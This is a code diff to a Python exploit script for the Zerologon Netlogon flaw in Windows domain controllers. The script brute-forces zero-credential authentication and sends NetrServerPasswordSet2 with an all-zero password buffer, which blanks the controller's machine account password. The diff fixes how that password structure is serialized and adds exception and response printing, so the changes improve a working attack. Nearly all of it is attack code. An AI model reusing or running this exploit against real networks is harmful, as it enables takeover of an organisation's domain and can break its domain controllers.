@@ -12,6 +12,20 @@ from subprocess import check_call
 from Cryptodome.Cipher import DES, AES, ARC4
 from struct import pack, unpack
 
+from pprint import pprint
+
+import linecache
+import sys
+
+def PrintException():
+    exc_type, exc_obj, tb = sys.exc_info()
+    f = tb.tb_frame
+    lineno = tb.tb_lineno
+    filename = f.f_code.co_filename
+    linecache.checkcache(filename)
+    line = linecache.getline(filename, lineno, f.f_globals)
+    print('EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj))
+
 # Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
 MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
 
@@ -90,11 +104,19 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       request["Authenticator"] = authenticator
       #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
       #request['ReturnAuthenticator']['Timestamp'] = 0
-      request["ClearNewPassword"] = nrpc.NL_TRUST_PASSWORD()
-      request["ClearNewPassword"]["Buffer"] = b'\x00'*512
-      request["ClearNewPassword"]["Length"] = 0 # It winds up being 516 bytes mentioned in the Secur whitepaper because this is 4 bytes
+
+      cnp = nrpc.NL_TRUST_PASSWORD()
+      cnp['Buffer'] = b'\x00'*512
+      cnp['Length'] = 0
+      request["ClearNewPassword"] = cnp.getData()
+
+      #request["ClearNewPassword"]["Buffer"] = b'\x00'*512
+      #request["ClearNewPassword"]["Length"] = 0 # It winds up being 516 bytes mentioned in the Secur whitepaper because this is 4 bytes
       resp = rpc_con.request(request)
+
+      print('NetrServerPasswordSet2 response:\n')
       resp.dump()
+      print('end NetrServerPasswordSet2\n')
 
       #request['PrimaryName'] = NULL
       #request['ComputerName'] = target_computer + '\x00'
@@ -103,7 +125,7 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       #resp = rpc_con.request(request)
       #resp.dump()      
     except Exception as e:
-      print(e)
+       PrintException()
     return rpc_con
 
   except nrpc.DCERPCSessionError as ex:
@@ -125,7 +147,7 @@ def perform_attack(dc_handle, dc_ip, target_computer):
     rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
     
     if rpc_con == None:
-      print('=', end='', flush=True)
+      print(attempt, end='\r', flush=True)
     else:
       break
 
